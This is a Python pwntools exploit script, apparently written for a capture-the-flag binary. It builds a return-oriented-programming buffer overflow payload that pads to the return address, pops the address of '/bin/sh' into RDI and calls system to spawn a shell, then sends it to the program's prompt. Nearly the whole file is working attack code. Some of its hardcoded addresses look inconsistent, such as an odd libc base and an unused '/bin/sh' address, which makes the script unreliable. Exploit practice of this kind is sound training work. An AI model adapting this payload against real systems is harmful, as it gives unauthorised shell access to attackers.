from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Binary filename
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
exe = './idk.bin'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

# Lib-c offsets, found manually (ASLR_OFF)
libc.address = 0xa2f05213cc2
system = 0x401285 #0x401134 0x401285 got plt
systemgot = 0x401134
binsh = 0x7ffff7f62031
puts = 0x40132f
ls = 0x4040a0
main = 0x40128d

# POP RDI gadget (found with ropper)
pop_rdi = 0x4014c3

# How many bytes to the instruction pointer (RIP)?
padding = 104

payload = flat(
    asm('nop') * padding,  # Padding up to RIP
    pop_rdi,  # Pop the following address into the RDI register
    next(libc.search(b'/bin/sh\x00')),  # Address of /bin/sh in libc
    system,  # Address of system function in libc
)

# Write payload to file
write('payload', payload)

# Exploit
io.sendlineafter(b'(Ex secret.txt): ', payload)
# write('payload', payload2)
# io.sendlineafter(b'(Ex secret.txt): ', payload2)

# Get flag/shell
io.interactive()